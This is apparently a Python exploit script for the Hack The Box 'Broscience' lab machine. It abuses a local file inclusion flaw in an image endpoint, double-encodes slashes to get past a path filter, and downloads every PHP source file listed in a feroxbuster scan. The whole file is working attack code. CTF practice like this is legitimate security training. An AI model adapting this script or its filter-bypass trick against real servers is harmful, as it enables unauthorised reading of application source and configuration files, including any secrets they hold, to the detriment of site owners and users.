"""
Hack The Box: Broscience, File crawling and download via LFI
"""
import requests
import re
import urllib3
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


LFI_URI = "https://broscience.htb/includes/img.php?path=..%252f"


def encode_path(path: str) -> str:
    """Double encode the path to avoid the filter"""
    return path.replace("/", "%252f")


def get_content(file_path: str) -> bytes:
    """Get the file content"""
    url = f"{LFI_URI}{encode_path(file_path)}"
    r = requests.get(url, verify=False)
    print(f"[*] Getting {url}")
    return r.content
    
    
def download_file(file_path: Path):
    """Download the file"""
    file_content = get_content(str(file_path))
    root_path = Path(__file__).parent / "app"
    full_path = root_path / file_path
    if not full_path.parent.exists():
        full_path.parent.mkdir(parents=True)
    with open(full_path, "wb") as f:
        f.write(file_content)
    print(f"[+] Downloaded : {full_path}")


def main():
    with open("/root/BroScience/dir.feroxbuster", "r") as f:
        urls = f.read()
        
    php_paths = re.findall(r"broscience.htb/(\S*\.php)", urls)
    for path in set(php_paths):
        download_file(Path(path))
    
    
if __name__ == "__main__":
    main()


